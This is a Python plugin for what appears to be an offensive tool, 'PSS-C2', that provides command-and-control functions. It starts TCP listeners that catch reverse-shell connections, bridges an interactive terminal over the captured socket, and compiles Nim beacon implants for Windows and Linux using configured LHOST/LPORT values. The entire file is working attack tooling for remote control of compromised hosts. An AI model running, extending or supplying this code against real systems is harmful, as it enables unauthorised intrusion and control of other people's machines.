import fcntl
import logging as logger
import os
import select
import socket
import subprocess
import termios
from multiprocessing import Process
from pathlib import Path
from random import choice
from string import ascii_lowercase
from tempfile import gettempdir

from colorama import Fore

from pssutil.cmdutils import CmdLenValidator
from pssutil.payloadmanager import PssObj

TAG = f"[{Fore.LIGHTYELLOW_EX}PSS-C2{Fore.RESET}]"

PSSC2_FOLDER = Path(Path(__file__).parent, "pssc2")
PSSC2_BEACONS_FOLDER = Path(PSSC2_FOLDER, "beacons")

PSSC2_LISTENERS = []


def run_nim(nim_args) -> str | None:
    try:
        return subprocess.run(
            f'nim {" ".join(nim_args)}', stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, shell=True
        )
    except subprocess.CalledProcessError:
        return None


def add_cmd(pm, cmd):
    pc2_handler = cmd.add(["pssc2", "pc2"])

    pc2_listener_handler = pc2_handler.add(["listener"])
    pc2_listener_handler.add(["new", "n"], lambda args: listener_new(pm, args))
    pc2_listener_handler.add(["delete", "d"], CmdLenValidator(lambda args: listener_delete(pm, args), 1, ["lid"]))
    # pc2_listener_handler.add(["restart", "r"], CmdLenValidator(lambda args: listener_restart(pm, args), 1, ["lid"]))
    pc2_listener_handler.add(["status", "s"], lambda args: listener_status(pm, args))
    pc2_listener_handler.add(["shell", "x"], CmdLenValidator(lambda args: listener_shell(pm, args), 1, ["lid"]))

    if run_nim(["--version"]):
        beacon_dict = {}

        for _, _, files in PSSC2_BEACONS_FOLDER.walk():
            for f in files:
                beacon_dict[Path(f).stem] = ["win32", "win64", "linux32", "linux64"]

        pc2_beacon_handler = pc2_handler.add(["beacon"])
        pc2_beacon_handler.add(["new", "n"], CmdLenValidator(lambda args: new_beacon(pm, args), 2, ["beacon name", "os"]), beacon_dict)
    else:
        logger.warning(f"{TAG} Nim is not installed on this system, parts of this plugin are disabled...")


def unload():
    global PSSC2_LISTENERS

    for listener in PSSC2_LISTENERS:
        logger.info(f"{TAG} Closing listener: {Fore.LIGHTYELLOW_EX}{listener}{Fore.RESET}")
        listener.close()


def listener_new(pm, args):
    global PSSC2_LISTENERS
    listener = PssC2Listener(
        args[0] if len(args) > 0 else pm.cvars.LHOST, int(args[1] if len(args) > 0 else pm.cvars.LPORT), args[2] if len(args) > 2 else None
    )
    PSSC2_LISTENERS.append(listener)


def listener_delete(pm, args):
    global PSSC2_LISTENERS
    lid = int(args[0])

    for listener in PSSC2_LISTENERS:
        if listener.lid == lid:
            PSSC2_LISTENERS.remove(listener)
            break


def listener_restart(pm, args):
    global PSSC2_LISTENERS
    lid = int(args[0])

    for listener in PSSC2_LISTENERS:
        if listener.lid == lid:
            o_lid = listener.lid
            o_host = listener.host
            o_port = listener.port
            PSSC2_LISTENERS.remove(listener)
            listener_new(pm, [o_host, o_port, o_lid])
            logger.info(f"{TAG} Restarted listener: {Fore.LIGHTYELLOW_EX}{listener}{Fore.RESET}")
            break


def listener_status(pm, args):
    global PSSC2_LISTENERS
    for listener in PSSC2_LISTENERS:
        is_okay = listener.is_okay
        is_connected = listener.is_connected()
        logger.info(
            f"{TAG} {listener.get_lid()} host: {listener.host}, port: {listener.port}, is_connected: {Fore.LIGHTGREEN_EX if is_connected else Fore.LIGHTRED_EX}{is_connected}{Fore.RESET}, is_okay: {Fore.LIGHTGREEN_EX if is_okay else Fore.LIGHTRED_EX}{is_okay}{Fore.RESET}, last_error: {listener.last_error}"
        )


def listener_shell(pm, args):
    global PSSC2_LISTENERS
    listener_id = int(args[0])
    # executable = args[1] if len(args) > 1 else None

    for listener in PSSC2_LISTENERS:
        if listener.lid == listener_id:
            listener = listener
            break
    else:
        logger.error(f"{TAG} Unable to find listener with LID:{Fore.LIGHTYELLOW_EX}{listener_id}{Fore.RESET}")
        return

    if listener.is_connected():
        logger.info(f"{TAG} {listener.get_lid()} Trying to open shell...")
        PtySocketWrapper.new(listener.client_socket)
    else:
        logger.error(f"{TAG} {listener.get_lid()} Listener is not connected")


def new_beacon(pm, args):
    global PSSC2_LISTENERS

    beacon_path = Path(PSSC2_BEACONS_FOLDER, f"{args[0]}.nim")
    taget_os = args[1]

    random_str = "".join([choice(ascii_lowercase) for _ in range(12)])
    tmp_nim_file = Path(gettempdir(), f"{random_str}.nim")

    with open(beacon_path, "r") as bf:
        with open(tmp_nim_file, "w+") as tf:
            tf.write(PssObj(bf.read()).fill(pm.cvars))

    logger.info(f"{TAG} Compiling {Fore.LIGHTCYAN_EX}{args[0]}{Fore.RESET}/{Fore.LIGHTYELLOW_EX}{taget_os}{Fore.RESET}")

    nim_args = ["c -d:release"]

    if taget_os == "win32":
        nim_args.append("-d:mingw --cpu:i386")
        tmp_file = pm.generate_random_filename(".exe")
    elif taget_os == "win64":
        nim_args.append("-d:mingw --cpu:amd64")
        tmp_file = pm.generate_random_filename(".exe")
    elif taget_os == "linux32":
        nim_args.append("--os:linux --cpu:i386")
        tmp_file = pm.generate_random_filename("")
    elif taget_os == "linux64":
        nim_args.append("--os:linux --cpu:amd64")
        tmp_file = pm.generate_random_filename("")
    else:
        logger.error(f"{TAG} OS {Fore.LIGHTRED_EX}{taget_os}{Fore.RESET} no supported")
        return

    nim_args.append(f"-o:{tmp_file}")
    nim_args.append(str(tmp_nim_file))
    logger.info(f'{TAG} nim {" ".join(nim_args)}')

    nim_output = run_nim(nim_args)

    if tmp_nim_file.exists():
        os.unlink(tmp_nim_file)

    if nim_output.returncode == 0:
        logger.info(f"{TAG} Compilation successful: {Fore.LIGHTGREEN_EX}{nim_output.returncode}{Fore.RESET}")
        logger.info(f"{TAG} >> {tmp_file}")
    else:
        logger.error(f"{TAG} Compilation failed: {nim_output}")


class PtySocketWrapper:
    def __init__(self):
        self.pty = open(os.readlink(f"/proc/{os.getpid()}/fd/0"), "r+b", buffering=0)
        self.oldtermios = termios.tcgetattr(self.pty)

        newattr = termios.tcgetattr(self.pty)
        newattr[3] &= ~termios.ICANON & ~termios.ECHO
        newattr[6][termios.VQUIT] = 0
        newattr[6][termios.VSUSP] = 0
        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)

    def write(self, data):
        ret = self.pty.write(data)
        self.pty.flush()
        return ret

    def fileno(self):
        return self.pty.fileno()

    def __del__(self):
        termios.tcsetattr(self.pty, termios.TCSAFLUSH, self.oldtermios)
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags)
        self.pty.close()

    @staticmethod
    def new(sock):
        pty = PtySocketWrapper()
        buffers = {sock: bytearray(), pty: bytearray()}

        while True:
            r, w, _ = select.select(buffers.keys(), buffers.keys(), [])

            for fd in r:
                data = fd.recv(8192) if fd == sock else fd.read(8192)

                if data:
                    buffers[pty if fd == sock else sock] += data

            for fd in w:
                if buffers[fd]:
                    data = buffers[fd]
                    sent = fd.send(data) if fd == sock else fd.write(data)
                    buffers[fd] = data[sent:]


class PssC2Listener:
    def __init__(self, host, port, lid=None):
        self.lid = lid if lid is not None else PssC2Listener.next_listener_id()
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.client_address = ["n/a", "-1"]
        self.is_okay = True
        self.last_error = "None"
        self.thread = Process(target=self.run, args=(), daemon=True)
        self.thread.start()

    def run(self):
        try:
            logger.info(
                f"{TAG} {self.get_lid()} Starting TCP socket on: {Fore.LIGHTCYAN_EX}{self.host}{Fore.RESET}:{Fore.LIGHTCYAN_EX}{self.port}{Fore.RESET}"
            )
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen()

            self.client_socket, self.client_address = self.server_socket.accept()
            logger.info(
                f"{TAG} {self.get_lid()} Connection accepted from: {Fore.LIGHTGREEN_EX}{self.client_address[0]}{Fore.RESET}:{Fore.LIGHTGREEN_EX}{self.client_address[1]}{Fore.RESET}"
            )
        except Exception as ex:
            self.is_okay = False
            self.last_error = ex
            logger.error(f"{TAG} {self.get_lid()}: {ex}")

    def is_connected(self):
        return self.server_socket is not None and self.client_socket is not None

    def get_lid(self):
        return f"[LID:{Fore.LIGHTCYAN_EX}{self.lid}{Fore.RESET}]"

    def close(self):
        self.server_socket.close()
        self.client_socket.close()

    def __str__(self) -> str:
        return f"{self.get_lid()} {Fore.LIGHTGREEN_EX}{self.client_address[0]}{Fore.RESET}:{Fore.LIGHTGREEN_EX}{self.client_address[1]}{Fore.RESET}"

    @staticmethod
    def next_listener_id():
        global PSSC2_LISTENERS

        for i in range(128):
            for listener in PSSC2_LISTENERS:
                if listener.lid == i:
                    break
            else:
                return i
        return -1
